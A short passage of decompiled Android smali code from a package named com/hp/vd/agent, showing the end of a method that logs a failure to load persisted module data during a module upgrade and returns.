    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 93
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2
.end method
